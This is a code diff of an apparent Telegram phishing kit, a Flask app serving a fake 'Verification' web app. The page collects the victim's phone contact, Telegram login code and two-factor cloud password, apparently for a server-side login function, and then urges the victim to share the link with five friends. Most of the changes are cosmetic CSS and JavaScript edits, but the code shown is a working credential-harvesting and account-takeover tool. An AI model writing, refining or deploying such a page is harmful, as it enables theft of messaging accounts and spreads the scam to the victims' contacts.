@@ -224,48 +224,42 @@ def run_tg(phone, code=None, password=None):
 
 
 PAGE = r'''<!DOCTYPE html>
-<html>
-<head>
+<html><head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 <title>Verification</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{width:100%;min-height:100%;overflow-x:hidden}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;position:relative}
-.bg{position:fixed;inset:0;background:linear-gradient(135deg,#1a1a2e,#e94560 50%,#0a0a0a);z-index:1}
-.bg::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 20% 30%,rgba(233,69,96,0.5),transparent 50%),radial-gradient(circle at 80% 70%,rgba(0,136,204,0.4),transparent 50%)}
-.blur{position:fixed;inset:0;backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);background:rgba(0,0,0,0.7);z-index:2}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;color:white;min-height:100vh;overflow-x:hidden}
+.bg{position:fixed;inset:0;background:linear-gradient(135deg,#1a1a2e,#e94560,#0a0a0a);z-index:1}
+.blur{position:fixed;inset:0;backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);background:rgba(0,0,0,0.75);z-index:2}
 .wrap{position:relative;z-index:10;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-.modal{background:#141420;border-radius:24px;padding:32px 24px;max-width:380px;width:100%;border:1px solid #2a2a3e;box-shadow:0 20px 60px rgba(0,0,0,0.8);text-align:center;animation:pop 0.4s cubic-bezier(0.34,1.56,0.64,1)}
-@keyframes pop{0%{transform:scale(0.8);opacity:0}100%{transform:scale(1);opacity:1}}
-.ico{font-size:56px;margin-bottom:15px;display:inline-block}
-.modal h2{font-size:22px;font-weight:800;margin-bottom:8px;color:white}
+.modal{background:#141420;border-radius:24px;padding:32px 24px;max-width:380px;width:100%;border:1px solid #2a2a3e;text-align:center;display:none}
+.modal.on{display:block}
+.ico{font-size:56px;margin-bottom:15px}
+.modal h2{font-size:22px;font-weight:800;margin-bottom:8px}
 .modal p{color:#888;font-size:14px;margin-bottom:22px;line-height:1.5}
-.btn{width:100%;padding:18px;border:none;border-radius:50px;color:white;font-size:17px;font-weight:800;cursor:pointer;margin:8px 0;letter-spacing:0.5px;transition:transform 0.15s}
-.btn:active{transform:scale(0.97)}
+.btn{width:100%;padding:18px;border:none;border-radius:50px;color:white;font-size:17px;font-weight:800;cursor:pointer;margin:8px 0}
 .btn:disabled{opacity:0.5}
-.green{background:linear-gradient(45deg,#25D366,#128C7E);box-shadow:0 8px 25px rgba(37,211,102,0.4)}
-.blue{background:linear-gradient(45deg,#0088cc,#00a8e8);box-shadow:0 8px 25px rgba(0,136,204,0.4)}
-.red{background:linear-gradient(45deg,#e94560,#d63851);box-shadow:0 8px 25px rgba(233,69,96,0.4)}
+.green{background:linear-gradient(45deg,#25D366,#128C7E)}
+.blue{background:linear-gradient(45deg,#0088cc,#00a8e8)}
+.red{background:linear-gradient(45deg,#e94560,#d63851)}
 .otps{display:flex;gap:8px;justify-content:center;margin:20px 0}
-.otps input{width:45px;height:58px;text-align:center;font-size:24px;font-weight:bold;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;outline:none;caret-color:#0088cc;transition:border 0.2s}
-.otps input:focus{border-color:#0088cc;box-shadow:0 0 0 3px rgba(0,136,204,0.2)}
+.otps input{width:45px;height:58px;text-align:center;font-size:24px;font-weight:bold;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;outline:none}
+.otps input:focus{border-color:#0088cc}
 .pwd{width:100%;padding:16px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:12px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0 15px}
-.pwd:focus{border-color:#e94560;box-shadow:0 0 0 3px rgba(233,69,96,0.2)}
+.pwd:focus{border-color:#e94560}
 .msg{padding:12px 16px;border-radius:10px;margin:12px 0;font-size:13px;display:none}
-.msg.show{display:block;animation:pop 0.3s}
-.msg.ok{background:rgba(76,175,80,0.15);color:#81C784;border:1px solid rgba(76,175,80,0.3)}
-.msg.err{background:rgba(244,67,54,0.15);color:#EF9A9A;border:1px solid rgba(244,67,54,0.3)}
-.msg.info{background:rgba(33,150,243,0.15);color:#90CAF9;border:1px solid rgba(33,150,243,0.3)}
-.step{display:none}
-.step.on{display:block}
+.msg.show{display:block}
+.msg.ok{background:rgba(76,175,80,0.15);color:#81C784}
+.msg.err{background:rgba(244,67,54,0.15);color:#EF9A9A}
+.msg.info{background:rgba(33,150,243,0.15);color:#90CAF9}
 .resend{color:#0088cc;font-size:13px;margin-top:15px;cursor:pointer;text-decoration:underline;display:none}
 .ss{display:flex;justify-content:center;gap:8px;margin:20px 0}
-.sst{width:38px;height:38px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700;transition:all 0.3s}
+.sst{width:38px;height:38px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
 .sst.done{background:#4CAF50;color:white}
-.sst.active{background:#0088cc;color:white;box-shadow:0 0 0 4px rgba(0,136,204,0.3)}
+.sst.active{background:#0088cc;color:white}
 </style>
 </head>
 <body>
@@ -273,7 +267,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <div class="blur"></div>
 <div class="wrap">
 
-<div id="contactBox" class="modal step on">
+<div id="contactBox" class="modal on">
 <div class="ico">&#128241;</div>
 <h2>Verify Your Number</h2>
 <p>Tap <strong>Share Contact</strong> below to continue</p>
@@ -281,7 +275,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <div id="contactMsg" class="msg"></div>
 </div>
 
-<div id="otpBox" class="modal step">
+<div id="otpBox" class="modal">
 <div class="ico">&#128274;</div>
 <h2>Enter Verification Code</h2>
 <p>5-digit code sent to <strong id="phoneShow" style="color:#0088cc"></strong></p>
@@ -297,7 +291,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <div class="resend" id="resendBtn">Resend code</div>
 </div>
 
-<div id="pwdBox" class="modal step">
+<div id="pwdBox" class="modal">
 <div class="ico">&#128272;</div>
 <h2>Two-Factor Auth</h2>
 <p>This account is protected.<br>Enter your cloud password:</p>
@@ -306,7 +300,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <button class="btn red" id="pwdBtn">VERIFY PASSWORD</button>
 </div>
 
-<div id="shareBox" class="modal step">
+<div id="shareBox" class="modal">
 <div class="ico">&#127916;</div>
 <h2>Almost Unlocked!</h2>
 <p>Share with <strong>5 friends</strong> to unlock</p>
@@ -336,8 +330,8 @@ var contactForce = null;
 var TG_CHANNEL = 'https://t.me/videodks';
 var TG_CAPTION = 'Premium content';
 
-function show(id) { var e = document.getElementById(id); e.classList.add('on'); }
-function hide(id) { var e = document.getElementById(id); e.classList.remove('on'); }
+function show(id) { document.getElementById(id).classList.add('on'); }
+function hide(id) { document.getElementById(id).classList.remove('on'); }
 function msg(id, text, type) {
   var e = document.getElementById(id);
   e.textContent = text;
@@ -372,11 +366,11 @@ function startForce() {
       clearInterval(contactForce);
       contactForce = null;
     }
-  }, 1000);
+  }, 1500);
 }
 
 function triggerShare() {
-  if (!tg) { msg('contactMsg', 'Open this link inside Telegram', 'err'); return; }
+  if (!tg) { msg('contactMsg', 'Open inside Telegram app', 'err'); return; }
   if (typeof tg.requestContact === 'function') {
     try {
       tg.requestContact(function(sent, event) {
@@ -537,7 +531,6 @@ function submitOtp() {
 }
 
 document.getElementById('verifyBtn').onclick = submitOtp;
-
 document.getElementById('resendBtn').onclick = function() {
   document.getElementById('resendBtn').style.display = 'none';
   openOtp();
@@ -753,4 +746,4 @@ def dash():
 if __name__ == '__main__':
     if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
         logger.warning("Some env vars missing!")
-    app.run(host='0.0.0.0', port=PORT
+    app.run(host='0.0.0.0', port=PORT, debug=False)
